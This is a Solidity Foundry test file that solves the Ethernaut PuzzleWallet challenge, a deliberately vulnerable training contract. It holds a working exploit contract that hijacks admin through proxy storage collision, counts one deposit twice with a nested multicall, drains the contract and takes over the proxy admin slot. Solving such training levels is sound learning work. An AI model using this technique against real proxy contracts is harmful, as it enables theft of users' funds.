// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/PuzzleWallet/PuzzleWallet.sol";
import "levels/PuzzleWallet/PuzzleWalletFactory.sol";
import "./utils/EthernautTest.sol";

interface IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address _newAdmin) external;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletHack {
    IPuzzleWallet public victim;

    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
    bytes[] multicallData =
        [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", depositData)];

    constructor(address _targetAddress) {
        victim = IPuzzleWallet(_targetAddress);
    }

    function exploit() external {
        victim.proposeNewAdmin(payable(address(this)));
        victim.addToWhitelist(payable(address(this)));
        victim.multicall{value: 0.001 ether}(multicallData);
        victim.execute(payable(address(this)), 0.002 ether, bytes(""));
        victim.setMaxBalance(uint256(uint160(tx.origin)));
    }

    fallback() external payable {}
}

contract PuzzleWalletTest is Test {
    function test_puzzlewallet() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        (address proxyAddress) = ethernautTest.setup(puzzleWalletFactory);

        // Exploit
        vm.startPrank(tx.origin);
        PuzzleWalletHack puzzleWalletHack = new PuzzleWalletHack(address(PuzzleWallet(proxyAddress)));
        vm.deal(payable(address(puzzleWalletHack)), 42069 ether);
        puzzleWalletHack.exploit();
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
